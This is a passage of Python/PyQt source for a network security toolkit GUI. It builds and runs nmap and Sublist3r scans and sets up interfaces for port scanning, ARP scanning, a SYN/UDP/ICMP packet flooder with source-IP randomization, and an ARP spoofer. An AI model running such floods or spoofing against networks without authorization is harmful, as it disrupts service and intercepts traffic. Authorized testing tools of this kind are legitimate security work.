        self.nmap_a_check.toggled.connect(on_aggressive_toggled)

        def on_ping_scan_toggled(text):
            is_ping_scan = (text == "Ping Scan (-sn)")
            for w in [detection_box, misc_box, self.nmap_ports_edit, timing_box, nse_box]:
                w.setDisabled(is_ping_scan)
        self.nmap_scan_type_combo.currentTextChanged.connect(on_ping_scan_toggled)

        return widget

    def _nmap_set_all_ports(self):
        """Sets the Nmap port text field to scan all ports."""
        self.nmap_ports_edit.setText("1-65535")

    def _handle_nmap_preset_selected(self, preset_name):
        """Populates the script fields based on the selected Nmap preset."""
        if preset_name == "-- Select a Preset --":
            self.nmap_custom_script_edit.clear()
            self.nmap_script_args_edit.clear()
            self.nmap_script_desc_label.setText("Description: --")
            return

        scripts, args, desc = self.nmap_script_presets.get(preset_name, ("", "", "No description available."))
        self.nmap_custom_script_edit.setText(scripts)
        self.nmap_script_args_edit.setText(args)
        self.nmap_script_desc_label.setText(f"Description: {desc}")

    def _nmap_toggle_super_complete(self):
        """Toggles the 'Super Complete Scan' preset."""
        if not self.super_scan_active:
            # --- Activate Preset ---
            self.nmap_ports_edit.setText("1-65535")
            self.nmap_scan_type_combo.setCurrentText("SYN Stealth Scan (-sS)")
            self.nmap_timing_combo.setCurrentText("T4 (Aggressive)")
            self.nmap_a_check.setChecked(True)
            self.nmap_v_check.setChecked(True)

            # Build and display the command preview
            target = self.nmap_target_edit.text() or "[target]"
            # We need a helper to build the command string since start_nmap_scan does it internally
            command_preview = self._build_nmap_command_preview(target)
            self.nmap_output_console.clear()
            self.nmap_output_console.setPlainText(f"# Preset command preview:\n$ {command_preview}")
            QMessageBox.information(self, "Preset Loaded", "Super Complete Scan options have been set.\nClick 'Start Scan' to run, or click the preset button again to cancel.")

            self.super_complete_btn.setText("Cancel Super Scan")
            self.super_scan_active = True
        else:
            # --- Deactivate Preset ---
            self.nmap_ports_edit.setText("")
            self.nmap_scan_type_combo.setCurrentIndex(0)
            self.nmap_timing_combo.setCurrentIndex(3)
            self.nmap_a_check.setChecked(False)
            self.nmap_v_check.setChecked(False)

            self.super_complete_btn.setText("Super Complete Scan")
            self.nmap_output_console.clear()
            self.super_scan_active = False

    def _build_nmap_script_args(self):
        """Builds the --script and --script-args parts of the nmap command."""
        script_parts = []

        # Handle -sC ("default scripts") checkbox. It's disabled by UI logic if -A is on.
        if self.nmap_sc_check.isChecked():
            script_parts.append("default")

        # Categories
        if self.nmap_nse_vuln_check.isChecked():
            script_parts.append("vuln")
        if self.nmap_nse_discovery_check.isChecked():
            script_parts.append("discovery")
        if self.nmap_nse_safe_check.isChecked():
            script_parts.append("safe")

        # Custom scripts
        custom_scripts = self.nmap_custom_script_edit.text().strip()
        if custom_scripts:
            script_parts.append(custom_scripts)

        command_args = []
        if script_parts:
            # Use a set to handle duplicates, e.g., if user enters 'safe' in custom scripts too.
            unique_scripts = sorted(list(set(script_parts)))
            command_args.extend(["--script", ",".join(unique_scripts)])

        # Script arguments
        script_args = self.nmap_script_args_edit.text().strip()
        if script_args:
            command_args.extend(["--script-args", script_args])

        return command_args

    def _build_nmap_command_preview(self, target):
        """Helper to build a command string for preview purposes."""
        # This can be a simplified version of the logic in start_nmap_scan
        command = ["nmap"]
        command.append(self.nmap_scan_type_combo.currentText().split(" ")[-1].strip("()"))
        command.append("-T" + self.nmap_timing_combo.currentText()[1])
        if self.nmap_a_check.isChecked(): command.append("-A")
        if self.nmap_v_check.isChecked(): command.append("-v")
        if self.nmap_pn_check.isChecked(): command.append("-Pn")
        ports = self.nmap_ports_edit.text()
        if ports: command.extend(["-p", ports])

        # Add NSE args to preview
        command.extend(self._build_nmap_script_args())

        command.append(target)
        return " ".join(command)

    def start_nmap_scan(self):
        """Starts the Nmap scan worker thread by building a command from the UI."""
        if not shutil.which("nmap"):
            QMessageBox.critical(self, "Nmap Error", "'nmap' command not found. Please ensure it is installed and in your system's PATH.")
            return

        if self.is_tool_running:
            QMessageBox.warning(self, "Busy", "Another tool is already running.")
            return

        target = self.nmap_target_edit.text()
        if not target:
            QMessageBox.critical(self, "Input Error", "Please provide a target for the Nmap scan.")
            return

        # Build the command dynamically from the UI
        command = ["nmap"]

        # Scan Type (mutually exclusive)
        scan_type_arg = self.nmap_scan_type_combo.currentText().split(" ")[-1].strip("()")
        command.append(scan_type_arg)

        # Timing
        timing_arg = "-T" + self.nmap_timing_combo.currentText()[1] # T<index>
        command.append(timing_arg)

        # Aggressive option overrides others
        if self.nmap_a_check.isChecked():
            command.append("-A")
        else:
            if self.nmap_sv_check.isChecked(): command.append("-sV")
            if self.nmap_o_check.isChecked(): command.append("-O")
            # -sC is now handled by _build_nmap_script_args
            if self.nmap_traceroute_check.isChecked(): command.append("--traceroute")

        # Miscellaneous
        if self.nmap_pn_check.isChecked(): command.append("-Pn")
        if self.nmap_v_check.isChecked(): command.append("-v")

        # Ports
        ports = self.nmap_ports_edit.text()
        if self.nmap_ports_edit.isEnabled():
            if ports:
                command.extend(["-p", ports])
            else:
                command.extend(["--top-ports", "1024"])

        # NSE Scripts
        command.extend(self._build_nmap_script_args())

        # XML Output
        try:
            # Create a temporary file to store the XML output, which is cleaner than parsing stdout
            with tempfile.NamedTemporaryFile(mode='w', delete=False, suffix=".xml", encoding='utf-8') as tmp_xml:
                self.nmap_xml_temp_file = tmp_xml.name
            command.extend(["-oX", self.nmap_xml_temp_file])
        except Exception as e:
            QMessageBox.critical(self, "File Error", f"Could not create temporary file for Nmap report: {e}")
            return

        command.append(target)

        self.is_tool_running = True
        self.nmap_start_btn.setEnabled(False)
        self.nmap_cancel_btn.setEnabled(True)
        self.nmap_report_btn.setEnabled(False) # Disable on new scan
        self.tool_stop_event.clear()
        self.nmap_output_console.clear()

        # Pass the fully constructed command to the thread
        self.worker = WorkerThread(self._nmap_scan_thread, args=(command,))
        self.active_threads.append(self.worker)
        self.worker.start()

    def generate_nmap_report(self):
        """Saves the Nmap XML and generates a styled HTML report using lxml."""
        if not self.nmap_last_xml:
            QMessageBox.information(self, "No Data", "Please run an Nmap scan first to generate data for the report.")
            return

        if not LXML_AVAILABLE:
            QMessageBox.critical(self, "Dependency Error", "The 'lxml' library is required for HTML report generation. Please install it using 'pip install lxml'.")
            return

        save_path, _ = QFileDialog.getSaveFileName(self, "Save Nmap HTML Report", "nmap_report.html", "HTML Files (*.html);;XML Files (*.xml)")
        if not save_path:
            return

        try:
            # Always save the raw XML data first
            if save_path.endswith('.html'):
                xml_path = os.path.splitext(save_path)[0] + ".xml"
            else:
                xml_path = save_path

            with open(xml_path, 'w', encoding='utf-8') as f:
                f.write(self.nmap_last_xml)

            # If the user wants HTML, perform the transformation
            if save_path.endswith('.html'):
                # Use a parser that can recover from errors, which can happen with Nmap's XML
                parser = etree.XMLParser(recover=True)
                xml_doc = etree.fromstring(self.nmap_last_xml.encode('utf-8'), parser=parser)

                # Check for the stylesheet file
                xsl_path = "nmap-bootstrap.xsl"
                if not os.path.exists(xsl_path):
                    QMessageBox.critical(self, "File Not Found", f"Stylesheet '{xsl_path}' not found. Make sure it is in the same directory as the application.")
                    return

                xsl_doc = etree.parse(xsl_path)
                transform = etree.XSLT(xsl_doc)
                html_doc = transform(xml_doc)

                with open(save_path, 'wb') as f:
                    f.write(etree.tostring(html_doc, pretty_print=True))

            QMessageBox.information(self, "Report Saved", f"Report successfully saved to:\n{os.path.realpath(save_path)}")

        except Exception as e:
            logging.error(f"Failed to generate or save Nmap report: {e}", exc_info=True)
            QMessageBox.critical(self, "Report Generation Error", f"An unexpected error occurred:\n{e}")

    def _nmap_scan_thread(self, command):
        q = self.tool_results_queue
        logging.info(f"Starting Nmap scan with command: {' '.join(command)}")
        q.put(('nmap_output', f"$ {' '.join(command)}\n\n"))

        try:
            startupinfo = None
            if sys.platform == "win32":
                startupinfo = subprocess.STARTUPINFO()
                startupinfo.dwFlags |= subprocess.STARTF_USESHOWWINDOW

            process = subprocess.Popen(command, stdout=subprocess.PIPE, stderr=subprocess.STDOUT, text=True, bufsize=1, startupinfo=startupinfo, encoding='utf-8', errors='replace')

            with self.thread_finish_lock:
                self.nmap_process = process

            for line in iter(process.stdout.readline, ''):
                if self.tool_stop_event.is_set():
                    process.terminate() # Terminate the process if cancelled
                    q.put(('nmap_output', "\n\n--- Scan Canceled By User ---\n"))
                    break
                q.put(('nmap_output', line))

            process.stdout.close()
            process.wait()

        except FileNotFoundError:
            q.put(('error', 'Nmap Error', "'nmap' command not found. Please ensure it is installed and in your system's PATH."))
        except Exception as e:
            q.put(('error', 'Nmap Error', str(e)))
        finally:
            # After scan, read the XML report from the temp file
            if self.nmap_xml_temp_file and os.path.exists(self.nmap_xml_temp_file):
                try:
                    with open(self.nmap_xml_temp_file, 'r', encoding='utf-8') as f:
                        xml_content = f.read()
                    if xml_content:
                        q.put(('nmap_xml_result', xml_content))
                except Exception as e:
                    logging.error(f"Could not read Nmap XML report: {e}")
                finally:
                    os.remove(self.nmap_xml_temp_file)
                    self.nmap_xml_temp_file = None

            q.put(('tool_finished', 'nmap_scan'))
            with self.thread_finish_lock:
                self.nmap_process = None
            logging.info("Nmap scan thread finished.")

    def _sublist3r_thread(self, domain):
        """Worker thread to run the Sublist3r script."""
        q = self.tool_results_queue
        command = ["python", "tools/sublist3r/sublist3r.py", "-d", domain]
        logging.info(f"Starting Sublist3r scan with command: {' '.join(command)}")
        q.put(('sublist3r_output', f"$ {' '.join(command)}\n\n"))

        try:
            startupinfo = None
            if sys.platform == "win32":
                startupinfo = subprocess.STARTUPINFO()
                startupinfo.dwFlags |= subprocess.STARTF_USESHOWWINDOW

            process = subprocess.Popen(command, stdout=subprocess.PIPE, stderr=subprocess.STDOUT, text=True, bufsize=1, startupinfo=startupinfo, encoding='utf-8', errors='replace')
            with self.thread_finish_lock:
                self.sublist3r_process = process

            full_output = []
            for line in iter(process.stdout.readline, ''):
                if self.tool_stop_event.is_set():
                    process.terminate()
                    q.put(('sublist3r_output', "\n\n--- Scan Canceled By User ---\n"))
                    break
                q.put(('sublist3r_output', line))
                full_output.append(line)

            process.stdout.close()
            process.wait()

            # If scan was not canceled, parse the results and show the popup
            if not self.tool_stop_event.is_set():
                results = []
                try:
                    # New method: Find the last non-empty line which should contain the JSON array
                    json_line = ""
                    for line in reversed(full_output):
                        stripped_line = line.strip()
                        if stripped_line:
                            json_line = stripped_line
                            break

                    if json_line.startswith('[') and json_line.endswith(']'):
                        results = json.loads(json_line)
                        logging.info(f"Successfully parsed {len(results)} subdomains from sublist3r JSON output.")
                    else:
                        # This will trigger the fallback logic
                        raise ValueError("Could not find JSON list in output.")

                except (json.JSONDecodeError, IndexError, ValueError) as e:
                    logging.warning(f"Could not parse JSON from sublist3r output ({e}), falling back to fragile text parsing.")
                    # Fallback to old, fragile parsing method
                    for line in reversed(full_output):
                        if "Total Unique Subdomains Found" in line:
                            break # Stop when we hit the summary line
                        # A simple check to see if the line is likely a subdomain
                        if f'.{domain}' in line and not any(c in '<> ' for c in line):
                             results.append(line.strip())
                    results.reverse()

                q.put(('sublist3r_results', domain, results))

        except FileNotFoundError:
            q.put(('error', 'Sublist3r Error', "'python' command not found. Please ensure it is installed and in your system's PATH."))
        except Exception as e:
            q.put(('error', 'Sublist3r Error', str(e)))
        finally:
            q.put(('tool_finished', 'sublist3r_scan'))
            with self.thread_finish_lock:
                self.sublist3r_process = None
            logging.info("Sublist3r scan thread finished.")

    def _create_tools_tab(self,p=None):
        """Creates the tab container for the standard network tools."""
        tools_tabs = QTabWidget()
        tools_tabs.addTab(self._create_nmap_scanner_tool(), "Nmap Scan")
        tools_tabs.addTab(self._create_subdomain_scanner_tool(), "Subdomain Scanner")
        tools_tabs.addTab(self._create_port_scanner_tool(), "Port Scanner (Scapy)")
        tools_tabs.addTab(self._create_arp_scan_tool(), "ARP Scan")
        tools_tabs.addTab(self._create_ping_sweep_tool(), "Ping Sweep")
        tools_tabs.addTab(self._create_traceroute_tool(), "Traceroute")
        return tools_tabs

    def _create_subdomain_scanner_tool(self):
        """Creates the UI for the Sublist3r Subdomain Scanner tool."""
        widget = QWidget()
        layout = QVBoxLayout(widget)

        # --- Controls ---
        controls_frame = QFrame()
        controls_frame.setObjectName("controlPanel")
        controls_frame.setStyleSheet("#controlPanel { border: 1px solid #444; border-radius: 8px; padding: 5px; }")
        controls_layout = QHBoxLayout(controls_frame)

        controls_layout.addWidget(QLabel("Domain:"))
        self.sublist3r_domain_edit = QLineEdit("example.com")
        self.sublist3r_domain_edit.setToolTip("Enter the domain to enumerate subdomains for.")
        controls_layout.addWidget(self.sublist3r_domain_edit, 1) # Add stretch

        self.sublist3r_start_btn = QPushButton(QIcon("icons/search.svg"), " Start Scan")
        controls_layout.addWidget(self.sublist3r_start_btn)
        self.sublist3r_cancel_btn = QPushButton("Cancel")
        self.sublist3r_cancel_btn.setEnabled(False)
        controls_layout.addWidget(self.sublist3r_cancel_btn)
        layout.addWidget(controls_frame)

        # --- Output Console ---
        self.sublist3r_output = QPlainTextEdit()
        self.sublist3r_output.setReadOnly(True)
        self.sublist3r_output.setFont(QFont("Courier New", 10))
        self.sublist3r_output.setPlaceholderText("Sublist3r output will be displayed here...")
        layout.addWidget(self.sublist3r_output, 1)

        # Connections will be added in the next step
        self.sublist3r_start_btn.clicked.connect(self.start_sublist3r_scan)
        self.sublist3r_cancel_btn.clicked.connect(self.cancel_tool)

        return widget

    def start_sublist3r_scan(self):
        """Starts the Sublist3r scan worker thread."""
        if self.is_tool_running:
            QMessageBox.warning(self, "Busy", "Another tool is already running.")
            return

        domain = self.sublist3r_domain_edit.text()
        if not domain:
            QMessageBox.critical(self, "Input Error", "Please provide a domain to scan.")
            return

        self.is_tool_running = True
        self.sublist3r_start_btn.setEnabled(False)
        self.sublist3r_cancel_btn.setEnabled(True)
        self.tool_stop_event.clear()
        self.sublist3r_output.clear()

        self.worker = WorkerThread(self._sublist3r_thread, args=(domain,))
        self.active_threads.append(self.worker)
        self.worker.start()

    def _create_traceroute_tool(self):
        widget = QWidget()
        layout = QVBoxLayout(widget)

        self.trace_tree = QTreeWidget(); self.trace_tree.setColumnCount(4); self.trace_tree.setHeaderLabels(["Hop", "IP Address", "Host Name", "Time (ms)"])

        controls = QHBoxLayout()
        controls.addWidget(QLabel("Target:")); self.trace_target = QLineEdit("google.com"); controls.addWidget(self.trace_target)
        self.trace_button = QPushButton("Trace"); controls.addWidget(self.trace_button)
        self.trace_cancel_button = QPushButton("Cancel"); self.trace_cancel_button.setEnabled(False); controls.addWidget(self.trace_cancel_button)
        self.trace_status = QLabel(""); controls.addWidget(self.trace_status); controls.addStretch()

        layout.addLayout(controls)
        layout.addWidget(self.trace_tree)
        layout.addWidget(self._create_export_button(self.trace_tree))
        self.trace_button.clicked.connect(self.start_traceroute)
        self.trace_cancel_button.clicked.connect(self.cancel_tool)
        return widget

    def _update_tcp_scan_options_visibility(self, checked):
        """Shows or hides the TCP scan mode dropdown based on protocol selection."""
        is_tcp_selected = self.scan_proto_tcp_radio.isChecked() or self.scan_proto_both_radio.isChecked()
        self.tcp_scan_type_label.setVisible(is_tcp_selected)
        self.tcp_scan_type_combo.setVisible(is_tcp_selected)

    def _create_port_scanner_tool(self):
        widget = QWidget(); layout = QVBoxLayout(widget); controls = QFrame(); clayout = QVBoxLayout(controls)
        row1 = QHBoxLayout(); row1.addWidget(QLabel("Target:")); self.scan_target = QLineEdit("127.0.0.1"); self.scan_target.setToolTip("The IP address of the target machine.")
        row1.addWidget(self.scan_target)
        clayout.addLayout(row1)
        row2 = QHBoxLayout()
        row2.addWidget(QLabel("Ports:")); self.scan_ports = QLineEdit("22,80,443"); self.scan_ports.setToolTip("A comma-separated list of ports or port ranges (e.g., 22,80,100-200).")
        row2.addWidget(self.scan_ports)
        all_ports_btn = QPushButton("All"); all_ports_btn.setToolTip("Set the port range to all 65535 ports.")
        all_ports_btn.clicked.connect(lambda: self.scan_ports.setText("1-65535")); row2.addWidget(all_ports_btn)
        clayout.addLayout(row2)

        # Row 3: Protocol Type Radio Buttons
        row3 = QHBoxLayout()
        row3.addWidget(QLabel("Protocol:"))
        self.scan_proto_tcp_radio = QRadioButton("TCP"); self.scan_proto_tcp_radio.setChecked(True)
        self.scan_proto_udp_radio = QRadioButton("UDP")
        self.scan_proto_both_radio = QRadioButton("Both")
        self.scan_proto_group = QButtonGroup(self)
        self.scan_proto_group.addButton(self.scan_proto_tcp_radio)
        self.scan_proto_group.addButton(self.scan_proto_udp_radio)
        self.scan_proto_group.addButton(self.scan_proto_both_radio)
        row3.addWidget(self.scan_proto_tcp_radio)
        row3.addWidget(self.scan_proto_udp_radio)
        row3.addWidget(self.scan_proto_both_radio)
        row3.addStretch()
        clayout.addLayout(row3)

        # Row 4: Advanced TCP Scan Options
        row4 = QHBoxLayout()
        self.tcp_scan_type_label = QLabel("TCP Scan Mode:")
        row4.addWidget(self.tcp_scan_type_label)
        self.tcp_scan_type_combo = QComboBox()
        self.tcp_scan_type_combo.addItems(["SYN Scan", "FIN Scan", "Xmas Scan", "Null Scan", "ACK Scan"])
        self.tcp_scan_type_combo.setToolTip("Select the type of TCP scan to perform for firewall evasion.")
        row4.addWidget(self.tcp_scan_type_combo)
        row4.addStretch()
        self.scan_frag_check = QCheckBox("Use Fragments"); self.scan_frag_check.setToolTip("Send fragmented packets to potentially evade simple firewalls.")
        row4.addWidget(self.scan_frag_check)
        clayout.addLayout(row4)

        # Connect signals for UI logic
        self.scan_proto_tcp_radio.toggled.connect(self._update_tcp_scan_options_visibility)
        self.scan_proto_udp_radio.toggled.connect(self._update_tcp_scan_options_visibility)
        self.scan_proto_both_radio.toggled.connect(self._update_tcp_scan_options_visibility)

        scan_buttons_layout = QHBoxLayout()
        self.scan_button = QPushButton("Scan"); self.scan_button.setToolTip("Start the port scan.")
        scan_buttons_layout.addWidget(self.scan_button)
        self.scan_cancel_button = QPushButton("Cancel"); self.scan_cancel_button.setEnabled(False); self.scan_cancel_button.setToolTip("Stop the current scan.")
        scan_buttons_layout.addWidget(self.scan_cancel_button)
        clayout.addLayout(scan_buttons_layout)
        self.scan_status = QLabel(""); clayout.addWidget(self.scan_status)
        layout.addWidget(controls)
        self.scan_tree = QTreeWidget(); self.scan_tree.setColumnCount(3); self.scan_tree.setHeaderLabels(["Port", "State", "Service"])
        layout.addWidget(self.scan_tree)
        layout.addWidget(self._create_export_button(self.scan_tree))
        self.scan_button.clicked.connect(self.start_port_scan)
        self.scan_cancel_button.clicked.connect(self.cancel_tool)

        self._update_tcp_scan_options_visibility(True) # Initial state
        return widget

    def _create_arp_scan_tool(self):
        widget = QWidget(); layout = QVBoxLayout(widget)
        self.arp_tree=QTreeWidget(); self.arp_tree.setColumnCount(3); self.arp_tree.setHeaderLabels(["IP Address","MAC Address", "Status"])

        controls = QHBoxLayout()
        controls.addWidget(QLabel("Target Network:")); self.arp_target=QLineEdit("192.168.1.0/24"); controls.addWidget(self.arp_target)
        self.arp_scan_button=QPushButton("Scan"); controls.addWidget(self.arp_scan_button)
        self.arp_status=QLabel(""); controls.addWidget(self.arp_status); controls.addStretch()

        layout.addLayout(controls)
        layout.addWidget(self.arp_tree)
        layout.addWidget(self._create_export_button(self.arp_tree))
        self.arp_scan_button.clicked.connect(self.start_arp_scan)
        return widget

    def _create_ping_sweep_tool(self):
        widget = QWidget()
        layout = QVBoxLayout(widget)

        # Main controls
        controls_frame = QFrame()
        controls_frame.setFrameShape(QFrame.Shape.StyledPanel)
        controls = QVBoxLayout(controls_frame)

        row1 = QHBoxLayout()
        row1.addWidget(QLabel("Target Network (CIDR):"))
        self.ps_target_edit = QLineEdit("192.168.1.0/24")
        self.ps_target_edit.setToolTip("The target network range in CIDR notation (e.g., 192.168.1.0/24).")
        row1.addWidget(self.ps_target_edit)
        controls.addLayout(row1)

        # Options Box
        options_layout = QFormLayout()
        options_layout.setContentsMargins(5, 10, 5, 10)

        # Probe Type
        self.ps_probe_type_combo = QComboBox()
        self.ps_probe_type_combo.addItems(["ICMP Echo", "TCP SYN", "TCP ACK", "UDP Probe"])
        options_layout.addRow("Probe Type:", self.ps_probe_type_combo)

        # Ports
        self.ps_ports_label = QLabel("Target Port(s):")
        self.ps_ports_edit = QLineEdit("80,443,8080")
        self.ps_ports_edit.setToolTip("Comma-separated list of ports for TCP/UDP probes.")
        options_layout.addRow(self.ps_ports_label, self.ps_ports_edit)

        # Timeout
        self.ps_timeout_edit = QLineEdit("1")
        self.ps_timeout_edit.setToolTip("Timeout in seconds for each probe.")
        options_layout.addRow("Timeout (s):", self.ps_timeout_edit)

        # Threads
        self.ps_threads_edit = QLineEdit("10")
        self.ps_threads_edit.setToolTip("Number of concurrent threads to use for scanning.")
        options_layout.addRow("Threads:", self.ps_threads_edit)
        controls.addLayout(options_layout)
        layout.addWidget(controls_frame)

        buttons_layout = QHBoxLayout()
        self.ps_start_button = QPushButton("Start Sweep")
        buttons_layout.addWidget(self.ps_start_button)
        self.ps_cancel_button = QPushButton("Cancel")
        self.ps_cancel_button.setEnabled(False)
        buttons_layout.addWidget(self.ps_cancel_button)
        layout.addLayout(buttons_layout)

        self.ps_status_label = QLabel("Status: Idle")
        layout.addWidget(self.ps_status_label)

        self.ps_tree = QTreeWidget()
        self.ps_tree.setColumnCount(2)
        self.ps_tree.setHeaderLabels(["IP Address", "Status"])
        layout.addWidget(self.ps_tree)
        layout.addWidget(self._create_export_button(self.ps_tree))

        # --- Connections and Logic ---
        def toggle_ports_visibility(text):
            is_tcp_or_udp = "TCP" in text or "UDP" in text
            self.ps_ports_label.setVisible(is_tcp_or_udp)
            self.ps_ports_edit.setVisible(is_tcp_or_udp)

        self.ps_probe_type_combo.currentTextChanged.connect(toggle_ports_visibility)
        # Set initial state
        is_tcp_or_udp_initial = "TCP" in self.ps_probe_type_combo.currentText() or "UDP" in self.ps_probe_type_combo.currentText()
        self.ps_ports_label.setVisible(is_tcp_or_udp_initial)
        self.ps_ports_edit.setVisible(is_tcp_or_udp_initial)


        self.ps_start_button.clicked.connect(self.start_ping_sweep)
        self.ps_cancel_button.clicked.connect(self.cancel_tool)

        return widget

    def _create_advanced_tools_tab(self, p=None):
        """Creates the tab container for advanced tools."""
        adv_tabs = QTabWidget()
        adv_tabs.addTab(self._create_flooder_tool(), "Packet Flooder")
        adv_tabs.addTab(self._create_firewall_tester_tool(), "Firewall Tester")
        adv_tabs.addTab(self._create_arp_spoofer_tool(), "ARP Spoofer")
        return adv_tabs

    def _create_flooder_tool(self):
        widget = QWidget()
        main_layout = QVBoxLayout(widget)

        # --- Attack Template Box ---
        template_box = QGroupBox("Attack Configuration")
        template_layout = QFormLayout(template_box)

        self.flood_template_combo = QComboBox()
        self.flood_template_combo.addItems(["Custom (from Crafter)", "TCP SYN Flood", "UDP Flood", "ICMP Echo Flood"])
        template_layout.addRow("Template:", self.flood_template_combo)

        self.flood_target_label = QLabel("Target IP:")
        self.flood_target_edit = QLineEdit("127.0.0.1")
        template_layout.addRow(self.flood_target_label, self.flood_target_edit)

        self.flood_ports_label = QLabel("Target Port(s):")
        self.flood_ports_edit = QLineEdit("80")
        self.flood_ports_edit.setToolTip("A single port for the flood attack.")
        template_layout.addRow(self.flood_ports_label, self.flood_ports_edit)

        self.flood_rand_src_ip_check = QCheckBox()
        self.flood_rand_src_ip_check.setToolTip("Randomize the source IP address for each packet.")
        template_layout.addRow("Randomize Source IP:", self.flood_rand_src_ip_check)
        main_layout.addWidget(template_box)

        # --- Custom Packet Box (for loading) ---
        packet_frame = QGroupBox("Custom Packet Loader")
        packet_layout = QVBoxLayout(packet_frame)
        self.flood_packet_label = QLabel("Packet to send: (Load from Crafter)")
        packet_layout.addWidget(self.flood_packet_label)
        load_btn = QPushButton("Load Packet from Crafter")
        load_btn.clicked.connect(self.load_flood_packet)
        packet_layout.addWidget(load_btn)
        main_layout.addWidget(packet_frame)

        # --- Flood Parameters ---
        controls_frame = QGroupBox("Flood Parameters")
        controls_layout = QFormLayout(controls_frame)
        self.flood_count = QLineEdit("1000")
        self.flood_count.setToolTip("The total number of packets to send.")
        controls_layout.addRow("Count:", self.flood_count)
        self.flood_interval = QLineEdit("0.01")
        self.flood_interval.setToolTip("The time interval (in seconds) between sending each packet.")
        controls_layout.addRow("Interval:", self.flood_interval)
        self.flood_threads = QLineEdit("4")
        self.flood_threads.setToolTip("The number of parallel threads to use for sending packets.")
        controls_layout.addRow("Threads:", self.flood_threads)
        main_layout.addWidget(controls_frame)

        # --- Action Buttons ---
        flood_buttons_layout = QHBoxLayout()
        self.flood_button = QPushButton("Start Flood")
        self.flood_button.setToolTip("Start the packet flood. Warning: This can cause network disruption.")
        flood_buttons_layout.addWidget(self.flood_button)
        self.stop_flood_button = QPushButton("Stop Flood")
        self.stop_flood_button.setEnabled(False)
        self.stop_flood_button.setToolTip("Stop the ongoing flood.")
        flood_buttons_layout.addWidget(self.stop_flood_button)
        main_layout.addLayout(flood_buttons_layout)

        self.flood_status = QLabel("")
        main_layout.addWidget(self.flood_status)
        main_layout.addStretch()

        # --- UI Logic ---
        def update_template_ui(text):
            is_custom = (text == "Custom (from Crafter)")
            is_icmp = (text == "ICMP Echo Flood")

            self.flood_target_label.setVisible(not is_custom)
            self.flood_target_edit.setVisible(not is_custom)
            self.flood_ports_label.setVisible(not is_custom and not is_icmp)
            self.flood_ports_edit.setVisible(not is_custom and not is_icmp)
            self.flood_rand_src_ip_check.setEnabled(not is_custom)
            packet_frame.setVisible(is_custom)

        self.flood_template_combo.currentTextChanged.connect(update_template_ui)
        update_template_ui(self.flood_template_combo.currentText()) # Initial state

        self.flood_button.clicked.connect(self.start_flood)
        self.stop_flood_button.clicked.connect(self.cancel_tool)

        return widget

    def _create_firewall_tester_tool(self):
        widget = QWidget(); layout = QVBoxLayout(widget); controls = QHBoxLayout()
        controls.addWidget(QLabel("Target:")); self.fw_target=QLineEdit("127.0.0.1"); controls.addWidget(self.fw_target)
        controls.addWidget(QLabel("Probe Set:")); self.fw_probe_set=QComboBox(); self.fw_probe_set.addItems(FIREWALL_PROBES.keys()); controls.addWidget(self.fw_probe_set)
        self.fw_test_button=QPushButton("Start Test"); controls.addWidget(self.fw_test_button)
        self.fw_cancel_button = QPushButton("Cancel"); self.fw_cancel_button.setEnabled(False); controls.addWidget(self.fw_cancel_button)
        self.fw_status=QLabel(""); controls.addWidget(self.fw_status); controls.addStretch()
        layout.addLayout(controls)
        self.fw_tree=QTreeWidget(); self.fw_tree.setColumnCount(3); self.fw_tree.setHeaderLabels(["Probe Description","Packet Summary","Result"])
        layout.addWidget(self.fw_tree)
        layout.addWidget(self._create_export_button(self.fw_tree))
        self.fw_test_button.clicked.connect(self.start_firewall_test)
        self.fw_cancel_button.clicked.connect(self.cancel_tool)
        return widget

    def _update_tcp_scan_options_visibility(self, checked):
        """Shows or hides the TCP scan mode dropdown based on protocol selection."""
        is_tcp_selected = self.scan_proto_tcp_radio.isChecked() or self.scan_proto_udp_radio.isChecked()
        self.tcp_scan_type_label.setVisible(is_tcp_selected)
        self.tcp_scan_type_combo.setVisible(is_tcp_selected)

    def _create_arp_spoofer_tool(self):
        widget = QWidget()
        layout = QVBoxLayout(widget)

        # Ethical Warning
        warning_label = QTextEdit()
        warning_label.setReadOnly(True)
        warning_label.setStyleSheet("background-color: #4c2222; color: #f0f0f0; border: 1px solid #993333;")
        warning_label.setHtml("""
        <font color='#ffcc00'><b>WARNING & ETHICAL NOTICE:</b></font>
        <p>ARP Spoofing is a powerful technique that can intercept and modify network traffic (Man-in-the-Middle attack). Using this tool on networks you do not own or have explicit, written permission to test is <b>illegal</b> and unethical.</p>
        <p>This tool is for educational and authorized security testing purposes only. The developer assumes no liability for misuse.</p>
        """)
        layout.addWidget(warning_label)

        # Controls
        controls = QFrame()
        controls.setFrameShape(QFrame.Shape.StyledPanel)
        clayout = QVBoxLayout(controls)

        # Target Inputs
        row1 = QHBoxLayout()
        row1.addWidget(QLabel("Victim IP:"))
        self.arp_spoof_victim_ip = QLineEdit()
        self.arp_spoof_victim_ip.setPlaceholderText("e.g., 192.168.1.10")
        self.arp_spoof_victim_ip.setToolTip("The IP address of the target (victim) machine on the local network.")
        row1.addWidget(self.arp_spoof_victim_ip)
        clayout.addLayout(row1)

        row2 = QHBoxLayout()
        row2.addWidget(QLabel("Target IP (Gateway):"))
        self.arp_spoof_target_ip = QLineEdit()
        self.arp_spoof_target_ip.setPlaceholderText("e.g., 192.168.1.1")
        self.arp_spoof_target_ip.setToolTip("The IP address of the machine you want to impersonate (usually the gateway).")
        row2.addWidget(self.arp_spoof_target_ip)
        clayout.addLayout(row2)

        # Buttons
        buttons_layout = QHBoxLayout()
        self.arp_spoof_start_btn = QPushButton("Start Spoofing")
        self.arp_spoof_start_btn.setToolTip("Begin sending malicious ARP packets to poison the cache of the victim and target.")
        buttons_layout.addWidget(self.arp_spoof_start_btn)
        self.arp_spoof_stop_btn = QPushButton("Stop Spoofing")
        self.arp_spoof_stop_btn.setEnabled(False)
        self.arp_spoof_stop_btn.setToolTip("Stop the attack and send corrective ARP packets to restore the network.")
        buttons_layout.addWidget(self.arp_spoof_stop_btn)
        clayout.addLayout(buttons_layout)

        # Status Label
        self.arp_spoof_status = QLabel("Status: Idle")
        clayout.addWidget(self.arp_spoof_status)

        layout.addWidget(controls)
        layout.addStretch()

        self.arp_spoof_start_btn.clicked.connect(self.start_arp_spoof)
        self.arp_spoof_stop_btn.clicked.connect(self.stop_arp_spoof)

        return widget

    def _create_system_info_tab(self):
        """Creates the System Info tab with a redesigned, more modern layout."""
        scroll_area = QScrollArea()
        scroll_area.setWidgetResizable(True)
        scroll_area.setStyleSheet("QScrollArea { border: none; }") # Remove scroll area border

        main_widget = QWidget()
        main_layout = QVBoxLayout(main_widget)
